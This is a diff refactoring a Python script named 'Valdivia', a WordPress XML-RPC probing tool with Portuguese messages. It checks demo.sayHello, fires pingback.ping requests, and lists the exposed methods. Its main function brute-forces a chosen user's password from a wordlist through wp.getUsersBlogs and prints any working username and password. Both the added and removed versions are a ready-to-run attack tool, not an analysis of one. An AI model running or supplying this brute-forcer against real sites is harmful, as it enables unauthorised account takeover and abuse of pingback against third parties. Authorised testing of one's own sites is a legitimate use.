@@ -1,110 +1,142 @@
 #!/usr/bin/env python3
-# Importação das bibliotecas necessárias
-import xmlrpc.client
+# -*- coding: utf-8 -*-
+
+import sys
 import os
+import xmlrpc.client
 import http.client
 import urllib.parse
 
-# Função para imprimir em cores
-def print_color(message, color):
-    colors = {"red": "\033[91m", "green": "\033[92m", "blue": "\033[94m", "orange": "\033[33m"}
-    end_color = "\033[0m"
-    print(colors[color] + message + end_color)
+def print_color(msg, color):
+    codes = {
+        'red':    '\033[91m',
+        'green':  '\033[92m',
+        'yellow': '\033[93m',
+        'blue':   '\033[94m',
+        'orange': '\033[33m',
+    }
+    reset = '\033[0m'
+    print(f"{codes.get(color,'')}{msg}{reset}")
 
-# Banner do programa
-print_color('''
+def say_hello(xmlrpc_url):
+    try:
+        client = xmlrpc.client.ServerProxy(xmlrpc_url)
+        resp = client.demo.sayHello()
+        print_color("sayHello OK", 'green')
+        print(resp)
+        return True
+    except Exception as e:
+        print_color(f"sayHello falhou: {e}", 'red')
+        return False
+
+def pingback(xmlrpc_url, source_url, target_url):
+    parsed = urllib.parse.urlparse(xmlrpc_url)
+    host = parsed.netloc
+    path = parsed.path or '/xmlrpc.php'
+    body = f"""<?xml version="1.0"?>
+<methodCall>
+  <methodName>pingback.ping</methodName>
+  <params>
+    <param><value><string>{source_url}</string></value></param>
+    <param><value><string>{target_url}</string></value></param>
+  </params>
+</methodCall>"""
+    try:
+        conn = http.client.HTTPSConnection(host)
+        conn.request("POST", path, body, {'Content-Type': 'text/xml'})
+        res = conn.getresponse()
+        data = res.read().decode('utf-8', errors='ignore')
+        if res.status == 200 and 'faultCode' not in data:
+            print_color("pingback OK", 'green')
+            print_color("Resposta:", 'blue')
+            print(data)
+            return True
+        else:
+            print_color("pingback falhou", 'red')
+            print(data)
+            return False
+    except Exception as e:
+        print_color(f"Erro no pingback: {e}", 'red')
+        return False
+
+def list_methods(xmlrpc_url):
+    try:
+        client = xmlrpc.client.ServerProxy(xmlrpc_url)
+        methods = client.system.listMethods()
+        print_color("Métodos disponíveis:", 'green')
+        for m in methods:
+            print_color(f"- {m}", 'orange')
+        return True
+    except Exception as e:
+        print_color(f"listMethods falhou: {e}", 'red')
+        return False
+
+def brute_login(xmlrpc_url, username, wordlist_path):
+    if not os.path.isfile(wordlist_path):
+        print_color("Wordlist não encontrada!", 'red')
+        return False
+
+    parsed = urllib.parse.urlparse(xmlrpc_url)
+    host = parsed.netloc
+    path = parsed.path or '/xmlrpc.php'
+
+    try:
+        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+            for line in f:
+                pwd = line.strip()
+                if not pwd:
+                    continue
+                try:
+                    client = xmlrpc.client.ServerProxy(xmlrpc_url)
+                    blogs = client.wp.getUsersBlogs(username, pwd)
+                    print_color(f"Login OK: {username}:{pwd}", 'green')
+                    print(blogs)
+                    return True
+                except xmlrpc.client.Fault:
+                    print_color(f"{username}:{pwd} → inválido", 'yellow')
+                except Exception as e:
+                    print_color(f"Erro ao testar {pwd}: {e}", 'red')
+                    return False
+        print_color("Nenhuma senha válida encontrada.", 'red')
+        return False
+    except Exception as e:
+        print_color(f"Erro ao abrir wordlist: {e}", 'red')
+        return False
+
+def main():
+    print_color("""
           __
- (\,--------'()'--o
+ (\\,--------'()'--o
  (_    ___    /~""
   (_)_)  (_)_)
-  
-  By M4Tr1XpDb
-''', "orange")
-print_color("Bem-vindo ao Valdivia, farejador de XMLRPC\n", "orange")
+By M4Tr1XpDb
+""", 'orange')
+    print_color("Bem-vindo ao Valdivia, farejador de XML-RPC\n", 'orange')
 
-# Teste sayHello
-site = input("Digite o endereço do sistema com xmlrpc:\n Exemplo: https://wordpress.com/xmlrpc.php\n")
-client = xmlrpc.client.ServerProxy(site)
-try:
-    result = client.demo.sayHello()
-    print_color("Teste sayHello executado com sucesso!", "green")
-except Exception as e:
-    print_color(f"Erro ao executar o teste sayHello: {e}", "red")
+    xmlrpc_url = input("Endpoint XML-RPC (ex: https://site.com/xmlrpc.php): ").strip()
+    if not xmlrpc_url:
+        print_color("URL inválida, abortando.", 'red')
+        sys.exit(1)
 
-# Teste pingback
-target_url = input("\nDigite o endereço do site para testar o pingback:\n Exemplo: https://meu_site_falso.com\n")
-target_url = target_url.rstrip("/")  # Remove a barra no final da URL, se existir
-try:
-    # Monta a requisição de pingback
-    headers = {"Content-type": "text/xml"}
-    body = f"""<?xml version="1.0" encoding="UTF-8"?>
-                <methodCall>
-                    <methodName>pingback.ping</methodName>
-                    <params>
-                        <param>
-                            <value><string>{site}</string></value>
-                        </param>
-                        <param>
-                            <value><string>{target_url}</string></value>
-                        </param>
-                    </params>
-                </methodCall>"""
-    # Envia a requisição de pingback
-    conn = http.client.HTTPSConnection(target_url.split("//")[1])
-    conn.request("POST", "/xmlrpc.php", body, headers)
-    response = conn.getresponse()
+    results = {}
+    results['sayhello'] = say_hello(xmlrpc_url)
 
-    # Verifica o resultado da requisição
-    if response.status == 200:
-        data = response.read()
-        if "faultCode" in str(data):
-            print_color("Erro ao executar o teste pingback!", "red")
-        else:
-            print_color("Teste pingback executado com sucesso!", "green")
-            print_color("Resposta do servidor:", "blue")
-            print(data.decode("utf-8"))
-    else:
-        print_color("Erro ao executar o teste pingback!", "red")
-except Exception as e:
-    print_color(f"Erro ao executar o teste pingback: {e}", "red")
-    
-    # Teste de métodos ativos
-try:
-    methods = client.system.listMethods()
-    print_color("\nMétodos ativos no sistema:", "green")
-    for method in methods:
-        print_color(method, "orange")
-except Exception as e:
-    print_color(f"Erro ao executar o teste de métodos ativos: {e}", "red")
-    
-# Teste de login
-username = input("\nDigite o nome de usuário para testar o login:\n")
-password_file = input("Digite o caminho completo do arquivo com as senhas:\n Exemplo: /usr/share/wordlists/ \n")
+    source_url = input("\nURL de origem para pingback (ex: https://meu_blog/post): ").strip()
+    target_url = input("URL de destino para pingback (ex: https://site.com): ").strip()
+    results['pingback'] = pingback(xmlrpc_url, source_url, target_url)
 
-if not os.path.isfile(password_file):
-    print_color("Arquivo de senhas não encontrado!", "red")
-    exit()
+    results['methods'] = list_methods(xmlrpc_url)
 
-with open(password_file, "r") as f:
-    passwords = [line.strip() for line in f.readlines()]
+    username = input("\nUsuário para brute-force: ").strip()
+    wordlist = input("Caminho completo da wordlist: ").strip()
+    results['brute_login'] = brute_login(xmlrpc_url, username, wordlist)
 
-for password in passwords:
-    try:
-        client = xmlrpc.client.ServerProxy(site)
-        result = client.wp.getUsersBlogs(username, password)
-        print_color(f"Login bem-sucedido! Usuário: {username} | Senha: {password}", "green")
-        break
-    except Exception as e:
-        print_color(f"Falha no login com senha {password}.", "red")
-else:
-    print_color(f"Falha no login para o usuário {username}.", "red")
-    
-# Resumo dos resultados
-printed_messages = []
-for color in ["green", "red"]:
-    color_messages = [msg for msg in os.linesep.join(printed_messages).split(os.linesep) if color in msg.lower()]
-    if color_messages:
-        print_color(os.linesep.join(color_messages), color)
-        printed_messages.append(os.linesep.join(color_messages))
-if not printed_messages:
-    print_color("Todos os testes foram executados com sucesso!", "green")
+    # Resumo final
+    print_color("\n===== Resumo dos testes =====", 'blue')
+    for name, ok in results.items():
+        status = "SUCESSO" if ok else "FALHOU"
+        color = 'green' if ok else 'red'
+        print_color(f"{name:12} : {status}", color)
+
+if __name__ == "__main__":
+    main()
